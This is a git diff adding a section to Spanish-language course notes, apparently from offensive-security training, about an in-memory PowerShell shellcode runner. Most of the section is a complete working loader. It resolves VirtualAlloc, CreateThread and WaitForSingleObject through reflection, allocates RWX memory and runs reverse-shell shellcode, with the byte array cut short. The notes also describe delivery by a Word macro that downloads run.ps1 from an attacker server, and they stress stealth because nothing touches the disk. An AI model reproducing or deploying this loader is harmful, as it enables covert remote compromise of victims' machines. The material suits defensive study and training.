@@ -589,3 +589,122 @@ Al cambiar el array de tipos en DefineConstructor y DefineMethod a @([String], [
 ¡Con esto completas los tres ejercicios! Ahora ya sabes cómo ejecutar cualquier API de Windows en memoria sin tocar el disco y sin usar Add-Type.
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5240898f-0616-4327-b0fa-be26a6590463" />
+
+## Shellcode Runner completo y funcional que se ejecuta 100% en memoria.
+
+La clave de este texto es que ya no vamos a ejecutar un simple MessageBoxA. Ahora vamos a usar VirtualAlloc, CreateThread y WaitForSingleObject usando la reflexión. Además, introducen una optimización importante para hacer el código más limpio y reutilizable.
+
+Aquí te explico los puntos clave de este texto:
+
+1. La función getDelegateType (Listing 89)
+En los ejemplos anteriores, cada vez que queríamos llamar a una API, teníamos que escribir todo el bloque de código para crear el "molde" del delegado (DefineDynamicAssembly, DefineType, DefineConstructor, etc.). Eso era muy repetitivo.
+
+Para solucionarlo, el autor convierte todo ese código en una función reutilizable llamada getDelegateType.
+
+Recibe como parámetros: $func (el array de tipos de argumentos) y $delType (el tipo de retorno, que por defecto es [Void]).
+
+Devuelve el objeto $type.CreateType(), que es el molde listo para usar.
+
+2. La llamada a VirtualAlloc (Listing 90 y 91)
+Ahora usan LookupFunc para obtener la dirección de VirtualAlloc y getDelegateType para crear el molde. Luego, con GetDelegateForFunctionPointer, los unen y lo invocan.
+
+El texto muestra una versión condensada (Listing 91) que elimina las variables intermedias. Todo se hace en una sola línea:
+```
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+```
+
+0x1000: Tamaño del buffer a reservar (4096 bytes).
+
+0x3000: MEM_COMMIT | MEM_RESERVE.
+
+0x40: PAGE_EXECUTE_READWRITE (RWX).
+
+Devuelve $lpMem, un puntero a la memoria asignada.
+
+3. Copiar el Shellcode (Listing 92)
+El shellcode debe ser de 32 bits (windows/shell_reverse_tcp), porque Word lanza un proceso de PowerShell de 32 bits.
+```[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0... # Tu shellcode completo
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+```
+
+Esta función de .NET copia el array de bytes directamente a la dirección de memoria que reservamos ($lpMem). No hay bucles For como en VBA; es una copia directa en memoria.
+
+4. Ejecutar el Hilo y Mantenerlo Vivo (Listing 93)
+Aquí ocurren los últimos pasos:
+
+CreateThread: Se resuelve y se llama usando el mismo método reflectivo. Se le pasa $lpMem como dirección de inicio. Esto lanza el shellcode en un nuevo hilo. Devuelve un manejador de hilo ($hThread).
+
+WaitForSingleObject: Esta es la parte nueva y crucial. Si no la usamos, PowerShell terminaría inmediatamente después de lanzar el hilo, cerrando la conexión de la reverse shell. WaitForSingleObject le dice a PowerShell: "Pausa tu ejecución y espera a que este hilo termine". Como el hilo de la shell nunca termina (hasta que cierras la conexión), PowerShell se queda vivo, manteniendo la shell abierta.
+
+5. Integración con Word (La parte final del texto)
+El texto menciona que no necesitas actualizar la macro de Word.
+
+La macro de Word ahora solo necesita descargar un archivo run.ps1 desde tu servidor de Kali y ejecutarlo con PowerShell.
+
+El run.ps1 contiene todo este código de reflexión.
+
+Esto es mucho más sigiloso porque el shellcode no está dentro del documento de Word, sino en un script alojado en tu servidor, y se ejecuta en memoria sin tocar el disco.
+
+6. Verificación con Process Monitor (Figura 27)
+El texto enfatiza que, al usar ProcMon, puedes verificar que NO se escribe ningún archivo .cs en el disco y NO se lanza el compilador csc.exe. Esto es lo que diferencia esta técnica de la versión con Add-Type. Todo el proceso de creación del delegado ocurre en la memoria RAM.
+
+```
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+
+
+```
+
+
+
+
+Exercises
+- Generate a Meterpreter shellcode and obtain an in-memory PowerShell shellcode runner resulting in a reverse shell.
+- The code developed in this section was based on a 32-bit PowerShell process. Identify and modify needed elements to make this work from a 64-bit PowerShell process -> Cambia [UInt32] por [UIntPtr] o [UInt64] en los argumentos de tamaño.
+
+
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b8157dca-5205-4fa5-8f8b-63841a403743" />
